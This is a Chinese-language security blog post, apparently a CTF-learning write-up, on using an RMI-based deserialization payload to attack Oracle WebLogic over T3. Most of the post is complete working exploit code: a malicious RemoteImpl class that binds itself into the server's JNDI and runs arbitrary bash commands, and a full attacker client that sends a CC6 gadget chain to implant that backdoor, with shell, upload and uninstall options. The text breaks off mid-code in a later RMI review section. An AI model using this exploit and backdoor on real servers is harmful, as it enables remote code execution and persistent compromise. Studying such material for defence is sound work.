<h2 id="漏洞概况-2"><a href="#漏洞概况-2" class="headerlink" title="漏洞概况"></a>漏洞概况</h2><p>该漏洞是结合RMI对Weblogic进行反序列化的payload，分析起来比较的复杂，但是也很有意义，这就来尝试一波。这个payload是解决webloigc没回显时的方案，也就是不出网，也不打内存马的备案</p>
<h2 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>起手式：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.boogipop.payload;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> weblogic.cluster.singleton.ClusterMasterRemote;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RemoteImpl</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> <span class="keyword">implements</span> <span class="title class_">ClusterMasterRemote</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">Context</span> <span class="variable">ctx</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">            ctx.rebind(<span class="string">&quot;Boogipop&quot;</span>, <span class="keyword">new</span> <span class="title class_">RemoteImpl</span>());</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setServerLocation</span><span class="params">(String cmd, String args)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getServerLocation</span><span class="params">(String cmd)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">            List&lt;String&gt; cmds = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;String&gt;();</span><br><span class="line"></span><br><span class="line">            cmds.add(<span class="string">&quot;/bin/bash&quot;</span>);</span><br><span class="line">            cmds.add(<span class="string">&quot;-c&quot;</span>);</span><br><span class="line">            cmds.add(cmd);</span><br><span class="line"></span><br><span class="line">            <span class="type">ProcessBuilder</span> <span class="variable">processBuilder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(cmds);</span><br><span class="line">            processBuilder.redirectErrorStream(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">Process</span> <span class="variable">proc</span> <span class="operator">=</span> processBuilder.start();</span><br><span class="line"></span><br><span class="line">            <span class="type">BufferedReader</span> <span class="variable">br</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(proc.getInputStream()));</span><br><span class="line">            <span class="type">StringBuffer</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuffer</span>();</span><br><span class="line"></span><br><span class="line">            String line;</span><br><span class="line">            <span class="keyword">while</span> ((line = br.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">                sb.append(line).append(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> sb.toString();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">return</span> e.getMessage();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>准备一个恶意的远程接口类，将其编译成字节码，随之传入我们的payload</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.boogipop;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.boogipop.serial.Reflections;</span><br><span class="line"><span class="keyword">import</span> com.boogipop.ssl.WeblogicTrustManager;</span><br><span class="line"><span class="keyword">import</span> com.boogipop.weblogic.T3ProtocolOperation;</span><br><span class="line"><span class="keyword">import</span> com.boogipop.weblogic.WebLogicOperation;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.cli.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> org.mozilla.classfile.DefiningClassLoader;</span><br><span class="line"><span class="keyword">import</span> weblogic.cluster.singleton.ClusterMasterRemote;</span><br><span class="line"><span class="keyword">import</span> weblogic.jndi.Environment;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">JNDI_FACTORY</span> <span class="operator">=</span> <span class="string">&quot;weblogic.jndi.WLInitialContextFactory&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">TYPE</span> <span class="operator">=</span> <span class="string">&quot;marshall&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> List&lt;String&gt; types = Arrays.asList(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;marshall&quot;</span>, <span class="string">&quot;collection&quot;</span>, <span class="string">&quot;streamMessageImpl&quot;</span>&#125;);</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String version;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> CommandLine cmdLine;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;whoami&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">byte</span>[] bytes=&#123;your_bytes_code&#125;;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        System.setProperty(<span class="string">&quot;weblogic.security.allowCryptoJDefaultJCEVerification&quot;</span>, <span class="string">&quot;true&quot;</span>);</span><br><span class="line">        System.setProperty(<span class="string">&quot;weblogic.security.allowCryptoJDefaultPRNG&quot;</span>, <span class="string">&quot;true&quot;</span>);</span><br><span class="line">        System.setProperty(<span class="string">&quot;weblogic.security.SSL.ignoreHostnameVerification&quot;</span>, <span class="string">&quot;true&quot;</span>);</span><br><span class="line">        System.setProperty(<span class="string">&quot;weblogic.security.TrustKeyStore&quot;</span>, <span class="string">&quot;DemoTrust&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Options</span> <span class="variable">options</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Options</span>();</span><br><span class="line">        options.addOption(<span class="string">&quot;H&quot;</span>, <span class="literal">true</span>, <span class="string">&quot;Remote Host[need set]&quot;</span>);</span><br><span class="line">        options.addOption(<span class="string">&quot;P&quot;</span>, <span class="literal">true</span>, <span class="string">&quot;Remote Port[need set]&quot;</span>);</span><br><span class="line">        options.addOption(<span class="string">&quot;C&quot;</span>, <span class="literal">true</span>, <span class="string">&quot;Execute Command[need set]&quot;</span>);</span><br><span class="line">        options.addOption(<span class="string">&quot;T&quot;</span>, <span class="literal">true</span>, <span class="string">&quot;Payload Type&quot;</span> + types);</span><br><span class="line">        options.addOption(<span class="string">&quot;U&quot;</span>, <span class="literal">false</span>, <span class="string">&quot;Uninstall rmi&quot;</span>);</span><br><span class="line">        options.addOption(<span class="string">&quot;B&quot;</span>, <span class="literal">false</span>, <span class="string">&quot;Runtime Blind Execute Command maybe you should select os type&quot;</span>);</span><br><span class="line">        options.addOption(<span class="string">&quot;os&quot;</span>, <span class="literal">true</span>, <span class="string">&quot;Os Type [windows,linux]&quot;</span>);</span><br><span class="line">        options.addOption(<span class="string">&quot;https&quot;</span>, <span class="literal">false</span>, <span class="string">&quot;enable https or tls&quot;</span>);</span><br><span class="line">        options.addOption(<span class="string">&quot;shell&quot;</span>, <span class="literal">false</span>, <span class="string">&quot;enable shell module&quot;</span>);</span><br><span class="line">        options.addOption(<span class="string">&quot;upload&quot;</span>, <span class="literal">false</span>, <span class="string">&quot;enable upload a file&quot;</span>);</span><br><span class="line">        options.addOption(<span class="string">&quot;src&quot;</span>, <span class="literal">true</span>, <span class="string">&quot;path to src file &quot;</span>);</span><br><span class="line">        options.addOption(<span class="string">&quot;dst&quot;</span>, <span class="literal">true</span>, <span class="string">&quot;path to dst file &quot;</span>);</span><br><span class="line">        options.addOption(<span class="string">&quot;noExecPath&quot;</span>, <span class="literal">false</span>, <span class="string">&quot;custom execute path&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">host</span> <span class="operator">=</span> <span class="string">&quot;127.0.0&quot;</span>;</span><br><span class="line">            <span class="type">String</span> <span class="variable">port</span> <span class="operator">=</span> <span class="string">&quot;7001&quot;</span>;</span><br><span class="line">            <span class="type">CommandLineParser</span> <span class="variable">parser</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DefaultParser</span>();</span><br><span class="line">            cmdLine = parser.parse(options, args);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (cmdLine.hasOption(<span class="string">&quot;H&quot;</span>)) &#123;</span><br><span class="line">                host = cmdLine.getOptionValue(<span class="string">&quot;H&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="type">HelpFormatter</span> <span class="variable">formatter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HelpFormatter</span>();</span><br><span class="line">                formatter.printHelp(<span class="string">&quot;test&quot;</span>, options);</span><br><span class="line">                System.exit(<span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (cmdLine.hasOption(<span class="string">&quot;P&quot;</span>)) &#123;</span><br><span class="line">                port = cmdLine.getOptionValue(<span class="string">&quot;P&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (cmdLine.hasOption(<span class="string">&quot;C&quot;</span>)) &#123;</span><br><span class="line">                cmd = cmdLine.getOptionValue(<span class="string">&quot;C&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (cmdLine.hasOption(<span class="string">&quot;T&quot;</span>)) &#123;</span><br><span class="line">                TYPE = cmdLine.getOptionValue(<span class="string">&quot;T&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (cmdLine.hasOption(<span class="string">&quot;U&quot;</span>)) &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;开始删除rmi实例&quot;</span>);</span><br><span class="line">                WebLogicOperation.unInstallRmi(host, port);</span><br><span class="line">                System.out.println(<span class="string">&quot;后门删除实例&quot;</span>);</span><br><span class="line">                System.exit(<span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;t3://&quot;</span> + host + <span class="string">&quot;:&quot;</span> + port;</span><br><span class="line">            <span class="comment">// 安装RMI实例</span></span><br><span class="line">            invokeRMI(host,port);</span><br><span class="line">            <span class="type">Environment</span> <span class="variable">environment</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Environment</span>();</span><br><span class="line">            environment.setProviderUrl(url);</span><br><span class="line">            environment.setEnableServerAffinity(<span class="literal">false</span>);</span><br><span class="line">            environment.setSSLClientTrustManager(<span class="keyword">new</span> <span class="title class_">WeblogicTrustManager</span>());</span><br><span class="line">            <span class="type">Context</span> <span class="variable">context</span> <span class="operator">=</span> environment.getInitialContext();</span><br><span class="line">            <span class="type">ClusterMasterRemote</span> <span class="variable">remote</span> <span class="operator">=</span> (ClusterMasterRemote) context.lookup(<span class="string">&quot;Boogipop&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 调用RMI实例执行命令</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">res</span> <span class="operator">=</span> remote.getServerLocation(cmd);</span><br><span class="line">            System.out.println(res);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">invokeRMI</span><span class="params">(String host,String port)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//CC6将远程恶意类打入内存</span></span><br><span class="line">        <span class="keyword">final</span> <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;&#125;);</span><br><span class="line">        <span class="keyword">final</span> Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(DefiningClassLoader.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getDeclaredConstructor&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newInstance&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;defineClass&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, <span class="type">byte</span>[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;com.Boogipop.payload.RemoteImpl&quot;</span>, bytes&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;main&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String[].class&#125;&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>&#125;&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="comment">// 初始化map 设置laymap</span></span><br><span class="line">        Map&lt;Object,Object&gt; lazymap = LazyMap.decorate(innerMap,<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)); <span class="comment">//随便改成什么Transformer</span></span><br><span class="line">        TiedMapEntry tiedMapEntry=<span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazymap, <span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap=<span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        hashMap.put(tiedMapEntry,<span class="string">&quot;bbb&quot;</span>);</span><br><span class="line">        innerMap.remove(<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">factory</span> <span class="operator">=</span> LazyMap.class.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        factory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        Reflections.setFieldValue(transformerChain, <span class="string">&quot;iTransformers&quot;</span>, transformers);</span><br><span class="line">        factory.set(lazymap,transformerChain);</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objOut</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(out);</span><br><span class="line">        objOut.writeObject(hashMap);</span><br><span class="line">        objOut.flush();</span><br><span class="line">        objOut.close();</span><br><span class="line">        <span class="type">byte</span>[] payload = out.toByteArray();</span><br><span class="line">        T3ProtocolOperation.send(host, port, payload);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">tobytes</span><span class="params">()</span> <span class="keyword">throws</span> FileNotFoundException &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">jarname</span> <span class="operator">=</span><span class="string">&quot;E:\\CTFLearning\\WeblogicEnvironment-master\\weblogic_cmd-master\\weblogic_cmd-master\\out\\production\\weblogic_cmd\\com\\test\\payload\\RemoteImpl.class&quot;</span>;</span><br><span class="line">            <span class="type">InputStream</span> <span class="variable">is</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(jarname);</span><br><span class="line"></span><br><span class="line">            <span class="type">ByteArrayOutputStream</span> <span class="variable">bytestream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">            <span class="type">int</span> ch;</span><br><span class="line">            <span class="type">byte</span> imgdata[] = <span class="literal">null</span>;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">while</span> ((ch = is.read()) != -<span class="number">1</span>) &#123;</span><br><span class="line">                    bytestream.write(ch);</span><br><span class="line">                &#125;</span><br><span class="line">                imgdata = bytestream.toByteArray();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    bytestream.close();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println(Arrays.toString(imgdata));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>随之一键运行：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1681283856197-25428d50-ec36-4f08-bced-ee36d148c077.png#averageHue=%232e3135&clientId=u144bde1e-439a-4&from=paste&height=239&id=u75bdd731&originHeight=299&originWidth=955&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=37005&status=done&style=none&taskId=u54dc984c-3317-4070-b3dd-06d458a490e&title=&width=764" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1681283850586-181153ad-a7d1-48fe-ac33-3438285b0c5f.png#averageHue=%23232524&clientId=u144bde1e-439a-4&from=paste&height=123&id=u02dadc76&originHeight=154&originWidth=612&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=124080&status=done&style=none&taskId=u802cab48-1c02-4408-89d4-99f274d446e&title=&width=489.6" alt="image.png"><br>有关改写weblogic_cmd的请移步：<br><a target="_blank" rel="noopener" href="https://www.yuque.com/boogipop/iwyn7t/hbsmksrz33ogytfo?view=doc_embed">记一次Weblogic_cmd小改</a></p>
<h2 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="RMI回顾"><a href="#RMI回顾" class="headerlink" title="RMI回顾"></a>RMI回顾</h3><p>有关主动请求恶意RMI服务端的东西：<br>以及ysoserial里exploit和payload模块里一些异同<br>在之前我们学习过RMI反序列化及其原理分析，这里我们简单回顾一下<br>Server:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.test.rmi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> 